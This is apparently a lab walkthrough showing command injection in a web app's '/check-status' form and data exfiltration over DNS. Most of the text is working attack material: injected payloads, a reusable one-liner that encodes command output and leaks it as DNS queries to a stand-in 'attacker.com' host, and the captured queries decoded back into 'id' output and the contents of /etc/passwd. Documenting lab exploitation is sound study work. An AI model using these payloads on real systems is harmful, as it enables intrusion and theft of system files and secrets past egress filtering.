# DNS Exfiltration
## Getting command injection
Testing simple payloads like `google.com;curl http://172.17.0.1/test` will hang (because iptables only allowing outgoing TCP on ports 49335-49355) until the clean-up script `monitor-processes.sh` will kill it, generating the error message `Bad input!`. 

After a bit of trail-and-error the user will find that command injection is possible by setting up a local DNS server and sending `dig` requests to it.

```bash
## request
POST /check-status HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 48
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/check-status
Accept-Encoding: gzip, deflate, br
Cookie: uuid_hash=8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed
Connection: keep-alive

site=google.com;dig+%40172.17.0.1+attacker.com

## reponse
» python3 dns-server.py -d                                                                     
Debug mode enabled. Queries will be printed to stdout.
DNS server started. Listening for incoming DNS requests...
Received DNS query: attacker.com. from ('172.17.0.2', 36802)
```

## Exfiltrate data
To find a working payload can be finicky, especially in this lab as we're not allowed to upload files to the victim through curl/wget etc. 

I've found that this one-liner works best for me:

`{ <COMMAND HERE> | base64 -w 0 | base58; echo; } | fold -w 60 | while read chunk; do dig @172.17.0.1 "${chunk}.attacker.com"; done`

```bash
## request (id)
site=attacker.com;{+id+|+base64+-w+0+|+base58%3b+echo%3b+}+|+fold+-w+60+|+while+read+chunk%3b+do+dig+%40172.17.0.1+"${chunk}.attacker.com"%3b+done

## response
» python3 dns-server.py -d                                                                     
Debug mode enabled. Queries will be printed to stdout.
DNS server started. Listening for incoming DNS requests...
Received DNS query: 2UuJyTCqpQyHyUA1svMzbXEoyeWkVQvztK38FcnoPF8YD8EACVZ2f898yNx5.attacker.com. from ('172.17.0.2', 40481)
Received DNS query: W3PRsS5c5KTzFLgBSKj8dfN6X7WKvSrBxjcF7h4.attacker.com. from ('172.17.0.2', 39649)

## decode
» cat dns-queries.log | awk '{print $7}' | cut -d'.' -f1 | tr -d '\r\n' | base58 -d | base64 -d          
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
## request (cat /etc/passwd)
...
site=attacker.com;{+cat+/etc/passwd+|+base64+-w+0+|+base58%3b+echo%3b+}+|+fold+-w+60+|+while+read+chunk%3b+do+dig+%40172.17.0.1+"${chunk}.attacker.com"%3b+done

## response
» python3 dns-server.py -d                                                                     
Debug mode enabled. Queries will be printed to stdout.
DNS server started. Listening for incoming DNS requests...
Received DNS query: JcLyUv9ktJ1u1AyBQfdEXErFSvQgPMTgKmprd4Edm5izsfBg17e5L9tnfV9U.attacker.com. from ('172.17.0.2', 39413)
Received DNS query: PAEfQYXe5R9nz8JfwRe1xRwroeDSUW7Qg7mKP9z12rYgH35CwYLevdFTf8g5.attacker.com. from ('172.17.0.2', 48169)
Received DNS query: rE6fHq9365oieczKAvNA8HN3JSyKB2YYcsA1PVTHUsEjRVziyy1CjiBCiDBR.attacker.com. from ('172.17.0.2', 34710)
Received DNS query: qH3Jyx9TTk8cDMXPT8n8xbweyTRjP7KNeJtAx7Fv2zeUjd7JPdJLJfC5f7j9.attacker.com. from ('172.17.0.2', 59756)
Received DNS query: FC6xRmpmRbMwLDofVWm1wce3uu1CmDDhPnmYoiqdEm1bQ9EXJSV9cK3WGi4s.attacker.com. from ('172.17.0.2', 60130)
Received DNS query: pgDcSgQFPqTUeKjf41tkC7JiWYBezRwHiTecDfv61RaKR5cPbKsXAb7GNgE2.attacker.com. from ('172.17.0.2', 51740)
Received DNS query: yUgBQ2q58aGw4DiXDJ1wwXRPTrydCV8p8nRNnmDeogjzwTbQm9RRXLtbrZRC.attacker.com. from ('172.17.0.2', 39974)
Received DNS query: CJ5yf7WXigbeNpnQnyWLECGZYrekqrA6YKRrcedeYBDqRqpzbWFyar4JXqHA.attacker.com. from ('172.17.0.2', 50132)
Received DNS query: LVkjccp1bTXKhdZDSCxXDdNzRccFueSLXTHbpetkHqoHWaTivv2Mr16H42t7.attacker.com. from ('172.17.0.2', 55830)
Received DNS query: tPty9rDTobxorRyjUXE4FpRm17hwSrQ5xt5H9ZJzvP8DnVqG9g13dRU7p9tE.attacker.com. from ('172.17.0.2', 45443)
Received DNS query: 2EMp6wu47BkU9hjkfXKwavgk1R1Z5rrFVqHx7x3Ku6wBCFfXosVQ7yRd7Bm1.attacker.com. from ('172.17.0.2', 56665)
Received DNS query: SaUv8ScAQAeSFheujrbRtiiZkpmU8yCyW9umsqTeCFfXXvWGwwZp9ueoR672.attacker.com. from ('172.17.0.2', 54329)
Received DNS query: DFEvqZzpgDVCcHPCNkPhc71gMvScaPzkL4en4g1VNNNMoTaCeG4iR5mcX67i.attacker.com. from ('172.17.0.2', 38022)
Received DNS query: 6izwhF9eVQWTAjpgM2AVhBuaP82qHzykNfcs475h963JUyPb77AhayxU3z1v.attacker.com. from ('172.17.0.2', 44175)
Received DNS query: aviPZjCkZxVrAJFVoNFE52hCA22m39G1VafgYtLiWMyZei8eN4hpEPDRSuUB.attacker.com. from ('172.17.0.2', 55222)
Received DNS query: iGwk1KGz76eaw5Kb81nm62amsVU7iFbGLvUNkQF8aEivwXxwh1su3REGMMAA.attacker.com. from ('172.17.0.2', 41008)
Received DNS query: 9eP5McHhuMCDVLeB86twijCeSawTriFJN6g6xar2CwRoAz9c1KgFoX3YfUzM.attacker.com. from ('172.17.0.2', 45369)
Received DNS query: KMusz6RkCneJuUam4AaNvKpY7r8jeELdjoz7cpQWzKnZrpipsQAq97MXdEYy.attacker.com. from ('172.17.0.2', 54651)
Received DNS query: oTGX1u4SiKLnqCrxYsLcHZnqTD1ryi5hXq5xMf1Fu6RJHEjDbDFoYpNenRyz.attacker.com. from ('172.17.0.2', 51442)
Received DNS query: 9CYEssEi6Y26jY3gvLjUqXpRCwcWCuhXJvqPVSSFjyovpjgS6vuw3sNFP2aX.attacker.com. from ('172.17.0.2', 50873)
Received DNS query: yv45JU3iATFGgvi2bFmTxU9fbQyH1y2uRnPmp6MT92brJ57rRDCS5L16hzTe.attacker.com. from ('172.17.0.2', 54886)
Received DNS query: bvBYQyUE4G1yFjyGMLDhDSvzhFw6W4Ga6UUBoZiQGCmMRBFDNoWrAijHhQzT.attacker.com. from ('172.17.0.2', 53230)
Received DNS query: PSJ555vq3zpPunmSt6RAwbfCH9ofauPfCKKj946ThQxsG8EodvBvW4DnJeNz.attacker.com. from ('172.17.0.2', 46185)
Received DNS query: iZjQkTnpTdYb9US1vi7wV69GhuGBDhU6b17TBcxTUps5gTdRBAdkpRx2M3Cn.attacker.com. from ('172.17.0.2', 46632)
Received DNS query: YLmrSZ7Eh2gyhCaZoSVrEDrTQaFDUq84s8mbvmFywQ45BJFd9hKNEWKXXxPn.attacker.com. from ('172.17.0.2', 53011)
Received DNS query: aVFz6qDoK5Laaea2ZkMGeyA4ckMoMNKYsVsPL4v7xyZF6ogZZW3ydjTtesCP.attacker.com. from ('172.17.0.2', 40031)
Received DNS query: DXcGPxkGxQqBqN5jsY2XL7so215Be6QoAjevnscqxEqzvtPTtSP4MHaTc.attacker.com. from ('172.17.0.2', 41400)

## decode
» cat dns-queries.log | awk '{print $7}' | cut -d'.' -f1 | tr -d '\r\n' | base58 -d | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

Note: the decode one-liner can only handle one command, meaning we need to delete `dns-queries.log` and restart `dns-server.py` after every command exfiltrated. 
